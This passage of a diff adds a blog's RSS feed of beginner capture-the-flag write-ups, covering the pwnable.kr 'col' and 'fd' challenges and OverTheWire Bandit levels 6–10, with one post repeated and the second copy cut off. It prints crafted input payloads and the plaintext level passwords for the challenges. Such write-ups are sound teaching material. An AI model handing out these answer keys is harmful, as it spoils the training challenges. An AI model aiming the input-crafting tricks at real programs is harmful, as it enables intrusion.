+           res += ip[i];
+        }   
+        return res;
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you remember, the size of a &lt;em&gt;char&lt;/em&gt; is 1 byte under x86, while &lt;em&gt;int&lt;/em&gt; is 4 bytes. What the first line inside the function does is casting a char pointer to an int pointer. This means if we were passing 20 chars, i.e., 20 bytes, it now corresponds to 20/4=5 ints. The &lt;em&gt;for&lt;/em&gt; loop then sums all these 5 ints into &lt;em&gt;res&lt;/em&gt;, which is the returned value.&lt;/p&gt;
+
+&lt;p&gt;All in all, what &lt;em&gt;check_password&lt;/em&gt; does is simply splitting our password string into 5 ints (4 chars each) and adding them up. What we need to find is a string that has the property of this result being equal to &lt;em&gt;0x21DD09EC&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;21DD09EC / 5 = 6C5CEC8,CCCCCCCCD
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Oh well, &lt;em&gt;0x21DD09EC&lt;/em&gt; is obviously not divisible by 5. The closest multiple of 5 is:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;21DD09ED / 5 = 6C5CEC9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we can say:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;21DD09ED = 6C5CEC9 + 6C5CEC9 + 6C5CEC9 + 6C5CEC9 + 6C5CEC9
+21DD09EC = 6C5CEC9 + 6C5CEC9 + 6C5CEC9 + 6C5CEC9 + 6C5CEC8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There is just a little problem here, each portion of the sum has 7 chars, instead of 8, so we add a 0 to the left as a padding.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 21DD09EC = 06C5CEC9*4 + 06C5CEC8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Before we proceed to converting it to ASCII, we must remember that x86 uses little endian notation, so the bytes should be in reverse order. Our password becomes:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\xC9\xCE\xC5\x06 * 4 + \xC8\xCE\xC5\x06
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we are almost ready to go! converting each of these portions into chars will require more then pure ASCII, which our terminal might no be able to represent due to encoding issues. There are other ways though besides directly printing \x06 char into the terminal:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./a.out $(echo -e &quot;\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC8\xCE\xC5\x06&quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;em&gt;$(…)&lt;/em&gt; enables us to give a command to be interpreted by the terminal. A more elegant and synthetic solution would be:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./a.out $(python2.7 -c &quot;print '\xC9\xCE\xC5\x06'*4 + '\xC8\xCE\xC5\x06' &quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Going back to the server:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;col@ubuntu:~$ ./col $(python2.7 -c &quot;print '\xC9\xCE\xC5\x06'\*4 + '\xC8\xCE\xC5\x06' &quot;)
+daddy! I just managed to create a hash collision :)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And there it is :)&lt;/p&gt;
+</description>
+				<pubDate>Tue, 06 Dec 2016 00:00:00 -0200</pubDate>
+				<link>/ctf/2016/12/06/pwnablekr-2.html</link>
+				<guid isPermaLink="true">/ctf/2016/12/06/pwnablekr-2.html</guid>
+			</item>
+		
+			<item>
+				<title>Pwnable.kr - fd [1]</title>
+				<description>&lt;p&gt;&lt;a href=&quot;http://pwnable.kr&quot;&gt;http://pwnable.kr&lt;/a&gt; Pwnable.kr is an awesome wargame to learning PWNning, reverse engineering and a bunch of other scary beasts like these. Let’s begin with challenge #1.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Mommy! what is a file descriptor in Linux?
+
+* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU
+
+ssh fd@pwnable.kr -p2222 (pw:guest)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The first level of Pwnable.kr wargame is not exaclty difficult once you realize we are dealing with exploitation - something hard by definition.&lt;/p&gt;
+
+&lt;p&gt;Before we start, let’s copy the files to our local environment:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ scp -P 2222 fd@pwnable.kr:./* .
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once we have &lt;em&gt;fd&lt;/em&gt; and &lt;em&gt;fd.c&lt;/em&gt; we can start to play. Let’s run our baby:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./fd 123
+learn about Linux file IO
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok, something related to input/output in linux. Let’s move on. Analysing the code:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+char buf[32];
+int main(int argc, char* argv[], char* envp[]){
+    if(argc&amp;lt;2){
+        printf(&quot;pass argv[1] a number\n&quot;);
+        return 0;
+    }
+    int fd = atoi( argv[1] ) - 0x1234;
+    int len = 0;
+    len = read(fd, buf, 32);
+    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
+        printf(&quot;good job :)\n&quot;);
+        system(&quot;/bin/cat flag&quot;);
+        exit(0);
+    }
+    printf(&quot;learn about Linux file IO\n&quot;);
+    return 0;
+
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;First thing to notice here is line 13:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;len = read(fd, buf, 32);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;According to &lt;em&gt;man read&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;read()  attempts  to read up to count bytes from file descriptor fd into the buffer starting at *buf*.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok, so what about our inputs. How is it read? Before copying it to &lt;em&gt;buf&lt;/em&gt;, the code first does&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int fd = atoi( argv[1] ) - 0x1234;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;atoi&lt;/em&gt; basically converts the given string to an int. So if you input “1234” (string) it will output 1234 as an int. Later in this line it subtracts this int from 0x1234, which is nothing but an int represented in hex.&lt;/p&gt;
+
+&lt;p&gt;Let us first see what happens if we can zero fd. For this we would need to pass 0x1234 to the program. BUT, as we have just seen, our input goes to &lt;em&gt;atoi()&lt;/em&gt;, so it must be in base10. Fair enough, we must then convert 0x1234 to decimal. Since I have been running lots of python code in the last weeks, here it goes :)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python
+Python 3.5.2 (default, Nov 17 2016, 17:05:23) 
+[GCC 5.4.0 20160609] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; i = 0x1234
+&amp;gt;&amp;gt;&amp;gt; i
+4660
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Very stupid, very good. Let’s pass 4660 to the program!&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./fd 4660
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aaaand, the program stalls, expecting more input. Hm, let’s see what happens if we give it LETMEWIN:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./fd 4660
+LETMEWIN
+good job :)
+/bin/cat: flag: No such file or directory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Oh boy! That was easier than expected.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-happened&quot;&gt;What happened?&lt;/h3&gt;
+&lt;p&gt;The condition we are looking for is the content of &lt;em&gt;buf&lt;/em&gt; to be “LETMEIN\n”. Why? Jbecause of&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;strcmp(s1, s2)&lt;/em&gt; compares s1 and s2 and returns 0 iff s1 is equal to s2. So we will only enter this &lt;em&gt;if&lt;/em&gt; in case &lt;em&gt;!strcmp(“LETMEWIN\n”, buf)&lt;/em&gt; is 1 (true), which means &lt;em&gt;strcmp(“LETMEWIN\n”, buf)&lt;/em&gt; must be 0, which means &lt;em&gt;buf&lt;/em&gt; must be equal to “LETMEWIN\n”. Not that complicated, just read again without fear :)&lt;/p&gt;
+
+&lt;p&gt;This still does not explain why when we enter “LETMEWIN\n” after the stall solves our problem. Or does it?&lt;/p&gt;
+
+&lt;p&gt;When we passed 4660 as input, the result of &lt;em&gt;fd&lt;/em&gt; in &lt;em&gt;int fd = atoi( argv[1] ) - 0x1234;&lt;/em&gt; was 0. The code then feeds &lt;em&gt;read()&lt;/em&gt; with this value. And then it stalls!&lt;/p&gt;
+
+&lt;p&gt;What happens here is that &lt;em&gt;read()&lt;/em&gt; is acutally a &lt;strong&gt;system call&lt;/strong&gt;, i.e. a call into the kernel code. Once this function is called, the kernel’s implementation of &lt;em&gt;read&lt;/em&gt; will check the file descriptor and dispatch it. 
+Normally, any program in an Unix environment has 3 file descriptors:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Standard input = 0&lt;/li&gt;
+  &lt;li&gt;Standard output = 1&lt;/li&gt;
+  &lt;li&gt;Standard error = 2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;If the file descriptor (fd) is 0, the process read from stdin. If 1, from stdout and if 2 from sterr.In our case, &lt;em&gt;fd&lt;/em&gt; is 0, which means to the kernel ot should look for the terminal for inputs util we have either typed 32 characters, a newline or an EOF marker (Ctrl+D). Then it is simply a matter of passing the input we want o/&lt;/p&gt;
+
+&lt;p&gt;Of course, once we have understood the solution, we must go back in the server to run it.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@ubuntu:~$ ./fd 4660
+LETMEWIN
+good job :)
+mommy! I think I know what a file descriptor is!!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+				<pubDate>Wed, 30 Nov 2016 00:00:00 -0200</pubDate>
+				<link>/ctf/2016/11/30/pwnablekr-1.html</link>
+				<guid isPermaLink="true">/ctf/2016/11/30/pwnablekr-1.html</guid>
+			</item>
+		
+			<item>
+				<title>Bandit CTF writeup [6-10]</title>
+				<description>&lt;h2 id=&quot;bandit-6&quot;&gt;Bandit 6&lt;/h2&gt;
+&lt;p&gt;The first thing that came to my mind here was simply to keep using &lt;em&gt;find&lt;/em&gt;’s powerful options. So now we add &lt;em&gt;-user&lt;/em&gt; and &lt;em&gt;-group&lt;/em&gt; in order to restrict our search. Also, we must search the whole tree of directories, not only &lt;em&gt;home&lt;/em&gt; folder:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit6@melinda:/$ find / -size 33c -user bandit7 -group bandit6
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The problem with this solution is that a bunch of “Permission denied” warnings pop out on the screen, making it harder for us to find the target file.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-happened&quot;&gt;What happened?&lt;/h3&gt;
+&lt;p&gt;Since we are now searching from the root of the tree downwards, we stumble in many files we do not have permission to touch.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;In a previous level we learned every Unix program normally has 3 I/O streams, one of them called &lt;em&gt;stderr&lt;/em&gt;. Also, remember that &lt;em&gt;stderr&lt;/em&gt; is represented as 2. To make the output of our search clearer we want to shut those annoying “Permission denied” error messages up. So we simply redirect them to the neverending well of unuseful stuff. The Unix system’s black hole. The real void. The &lt;em&gt;/dev/null&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit6@melinda:/$ find / -size 33c -user bandit7 -group bandit6 2&amp;gt;/dev/null
+/var/lib/dpkg/info/bandit7.password
+bandit6@melinda:/$ cat /var/lib/dpkg/info/bandit7.password
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Much better now :)&lt;/p&gt;
+
+&lt;h2 id=&quot;bandit-7&quot;&gt;Bandit 7&lt;/h2&gt;
+&lt;p&gt;Before diving into the solution let us check some borderline conditions:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit7@melinda:~$ ls -lh
+total 4.0M
+-rw-r----- 1 bandit8 bandit7 4.0M Nov 14  2014 data.txt
+
+bandit7@melinda:~$ file data.txt 
+data.txt: UTF-8 Unicode text
+
+bandit7@melinda:~$ wc -c data.txt 
+4184396 data.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We have a 4MB text file, meaning there are 4184396 characters in it! Too big to just go sneaking around.&lt;/p&gt;
+
+&lt;p&gt;One of the multiple available solutions is to cat the file and pipe it to the &lt;em&gt;grep&lt;/em&gt; tool. This way we might extract just the line in which the word “millionth” appears.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit7@melinda:~$ cat data.txt | grep millionth
+millionth   cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;bandit-8&quot;&gt;Bandit 8&lt;/h2&gt;
+&lt;p&gt;Our data.txt is still a big text file, so we will need to process it instead of searching like fools. Our friendly tools this time are &lt;em&gt;uniq&lt;/em&gt; and &lt;em&gt;sort&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Since the passoword is the only non-repeating line in the file, &lt;em&gt;uniq&lt;/em&gt; is the obvious choice. According to man:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uniq - report or omit repeated lines
+...
+DESCRIPTION
+Filter  adjacent  matching lines from INPUT (or standard input), writing to OUTPUT (or standard output).
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nevertheless, when we run it we still get a lot of text, even when using option -u for printing unique lines only.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-happened-1&quot;&gt;What happened?&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;uniq&lt;/em&gt; will compare &lt;strong&gt;adjacent&lt;/strong&gt; lines, according to the man page. This means if the repeated line is not immediately before or after its twin, uniq will not filter them.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;This is where &lt;em&gt;sort&lt;/em&gt; comes in. We first sort the lines of the file alphabetically and then apply the &lt;em&gt;uniq&lt;/em&gt; filter over the result (we &lt;em&gt;pipe&lt;/em&gt; the commands):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit8@melinda:~$ sort data.txt | uniq -u
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The good thing here is we do not even need &lt;em&gt;cat&lt;/em&gt;, since &lt;em&gt;sort&lt;/em&gt; writes its output to stdout :)&lt;/p&gt;
+
+&lt;h2 id=&quot;bandit-9&quot;&gt;Bandit 9&lt;/h2&gt;
+&lt;p&gt;This time our &lt;em&gt;data.txt&lt;/em&gt; has some binary data and a password somewhere in the middle of the junk, prepended by “several ‘=’ characters”.&lt;/p&gt;
+
+&lt;p&gt;The most immediate way I could think was to grep ‘==’. As expected it does not work and we receive:&lt;/p&gt;
+
+&lt;h3 id=&quot;what-happened-2&quot;&gt;What happened?&lt;/h3&gt;
+&lt;p&gt;Why can’t a simple &lt;em&gt;grep&lt;/em&gt; solve it? Let’s check:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@melinda:~$ grep '==' data.txt
+Binary file data.txt matches
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hm, it seems it thinks the file contains binary data. Let’s check a little deeper:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@melinda:~$ od -c data.txt
+...
+0045520 300 334   b   * 347 360 350   1   K 355 335 026   k 004 220 214
+0045540   4   -   = 002 307   % 216   h 376   ] 350 201 243   i  \n   H
+0045560 210 237   { 235   ^ 367 255   \   P 376   _   7 246 213   S 244
+0045600 267   w 233 347  \b 031   C   _ 304   p 377 260   ^ 242 354 325
+0045620 356   .   4   J 232  \b 214   v   z 310 214   p   J 036 307   D
+0045640 372 246 235 216 226 225   y 003 236 320  **\0**  \f 350   ?   5 223
+0045660 266 204 245
+0045663
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So you see, there is at least one &lt;strong&gt;\0&lt;/strong&gt; character, which is enough for grep to consider the whole file as a binary. Because of this it will deliver that annoying message.&lt;/p&gt;
+
+&lt;h3 id=&quot;solutions&quot;&gt;Solution(s)&lt;/h3&gt;
+&lt;p&gt;There are too many ways to solve it. Basically we want the tool we are going to use to interpret whatever it reads as text, not binary.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@melinda:~$ grep -a '==' data.txt
+�f�����^B �ﺱ&amp;gt;O^FD�_^P^Q��]�dL�Q�5bʵ���N��]��^F��^]W��^Z���94��%{�%�����h��n    oX:��|^U.�U��ކ�k��f&quot;�,�W�ſ^D�^Ax��ˋ!W^[�^X�l;l�rv��/�����P/��VX�o�*�����D�d6��.���#�v[u{m��S�[��r�Ⱦ�? 5�Nv���&amp;gt;h�.^\u^_�p^R��#��r@h^&amp;gt;U�n�#���M�`�a&amp;amp;bhR�^Z�k�^T�I�*���j߂
+                                                                    ^T���:ih��yk�T;����v&amp;lt;��:E|���}�����^T����wp�s�O&quot;��)���p$�^^�L�y L�K�    �1��+���v͋&quot;Y�N�^[^By&amp;gt;P^XK�Z�-�^_ȍ�t�����@^��^]c�
+                          ��ڿ��{�m��^[����g��:q���T-!u�{^R�
+z哞��1cF�========== **truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk**
+
+bandit9@melinda:~$ cat -v data.txt | grep ==
+zM-eM-^SM-^^M-@M-E1cFM-u========== **truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk**
+M-'{M-pM-3M-ixM-mM-^CLM-^[M-RV9p&amp;gt;^^^RazM-\M-g^T^V!7M-^_M-^BR#^UM-}M-^TtM-x7M-&quot;^GM-^[M-^P^G2^TM-njM-^OM-vM-C^ATM-&amp;amp;M-9uI^GM- M-t_M-^On^KM-hM-^I}`M-^AM-^@y&quot;X^B^CM-3ppM-^UM-.M-^LM-^P^PM-zmM-?n^GM-?^FYx^_^]aM-^PM-^XM-\M-^@M-oM-^E)+M-h*tM-^`M-O3-M-^]kM-qM-1y{hM-p^H#&quot;M-_)#&quot;M-rM-^DM-^EI^BY22fM-^EM-OM-{M-gUM-`M-b^^M-&quot;^G^Ky$M-^RM-,M-]  M-/M-i^NM-w&amp;lt;^TNM-)M-K5XdM-snM-^FM-WM-7M-^GM-QM-.M-kM-eM-^@Fk8M-^HM-^Z^OM-IM-R^FM-H^PM-G M-~!lM-GM-i[M-.eM-^HzM-^F^^^S:@M-^Vx^NM-7LM-^YM-D`65M-/%M-rQM-N^QM-(M-e^M&amp;amp;]M-Rd^OM-_^LM-,M-^ZM-CDM-%M-JM-^PM-2X^\M-gM-W^D1M-bM-4M-DM-OM-^RM-7&amp;amp;MM-^D6eM-^Dw=^HM-tAM-6^HM-&amp;lt;^EM-*^QM-^Wf\%^@M-6M-R^YZFM-qkwlM-^TNK.M-^^^O^VzM-:M-WCS\^CM-^EHM-=-M-^T^]AM-&amp;gt;)M-BM-sM-&quot;M-OM-n{M-{M-uM-^RM-oM-R]M-/M-=M-^_M-3M-ZM-G&amp;lt;M-^V'WT$M-3M-EM-!M-xJ\M-)M-^LJM-VM-P&quot;M-eM-sM-mM-^[M-]nM-nM-^MM-@   PM-,M-^T^R^_TyM-^W.M-^LDM-^[M-/M-q}ZM-^DM-L^Nm~M-9M-^[M-VM-^J8M-dM-vM-pM-3M-^YM-^ETM-HQ&quot;^EkM-EM-VhM-^JM-1JM-2M-tbM-!v?4sM-^V0M-^I$jM-^Q87M-^WhM-d^NM-&amp;gt;M-^MM-$/]^]1M-^Nl#M-jM-^AM-^?M-#b^ZM-y^DM-=M-eM-!M-^VM-^IM-^YM-lqM-\M-?M-^0M-==^D^@xp,b^ExM-wM-^_M-,M-y3M-WM-^EM-l^[M-^Yv^Y^_M-5&amp;gt;M-^GM-g^P+0)M-n^R    M-j:LM-?yM-hvM-dM-^\M-pwb;M-^N  M-{M-yM-i^ZM-1
+
+
+*bandit9@melinda:~$ strings data.txt | grep ==
+I========== the6
+========== password
+========== ism
+========== **truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk**
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Yep, I also agree the solution using strings is the simplest/most elegant :)&lt;/p&gt;
+
+&lt;h1 id=&quot;bandit-10&quot;&gt;Bandit 10&lt;/h1&gt;
+&lt;p&gt;Base64 is one of the most important encodings in computer science. It is mostly used due to historical reasons related to compatibility. Basically it takes 3 bytes (3 * 8 = 24 bits)and represents it as 4 chars in [a-zA-Z0-9], each spanning 6 bits (4*6 = 24 bits). Please google it in case this seems way too odd to you.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-2&quot;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;There are really no gotchas here. All the chall wants to show you is you can decode base64 from terminal.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit10@melinda:~$ cat data.txt 
+VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==
+bandit10@melinda:~$ cat data.txt | base64 --decode
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+				<pubDate>Wed, 30 Nov 2016 00:00:00 -0200</pubDate>
+				<link>/ctf/2016/11/30/bandit-wargame-11-to-15.html</link>
+				<guid isPermaLink="true">/ctf/2016/11/30/bandit-wargame-11-to-15.html</guid>
+			</item>
+		
+			<item>
+				<title>Bandit CTF writeup [6-10]</title>
+				<description>&lt;h2 id=&quot;bandit-6&quot;&gt;Bandit 6&lt;/h2&gt;
+&lt;p&gt;The first thing that came to my mind here was simply to keep using &lt;em&gt;find&lt;/em&gt;’s powerful options. So now we add &lt;em&gt;-user&lt;/em&gt; and &lt;em&gt;-group&lt;/em&gt; in order to restrict our search. Also, we must search the whole tree of directories, not only &lt;em&gt;home&lt;/em&gt; folder:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit6@melinda:/$ find / -size 33c -user bandit7 -group bandit6
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The problem with this solution is that a bunch of “Permission denied” warnings pop out on the screen, making it harder for us to find the target file.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-happened&quot;&gt;What happened?&lt;/h3&gt;
+&lt;p&gt;Since we are now searching from the root of the tree downwards, we stumble in many files we do not have permission to touch.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;In a previous level we learned every Unix program normally has 3 I/O streams, one of them called &lt;em&gt;stderr&lt;/em&gt;. Also, remember that &lt;em&gt;stderr&lt;/em&gt; is represented as 2. To make the output of our search clearer we want to shut those annoying “Permission denied” error messages up. So we simply redirect them to the neverending well of unuseful stuff. The Unix system’s black hole. The real void. The &lt;em&gt;/dev/null&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit6@melinda:/$ find / -size 33c -user bandit7 -group bandit6 2&amp;gt;/dev/null
+/var/lib/dpkg/info/bandit7.password
+bandit6@melinda:/$ cat /var/lib/dpkg/info/bandit7.password
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Much better now :)&lt;/p&gt;
+
+&lt;h2 id=&quot;bandit-7&quot;&gt;Bandit 7&lt;/h2&gt;
+&lt;p&gt;Before diving into the solution let us check some borderline conditions:&lt;/p&gt;
+
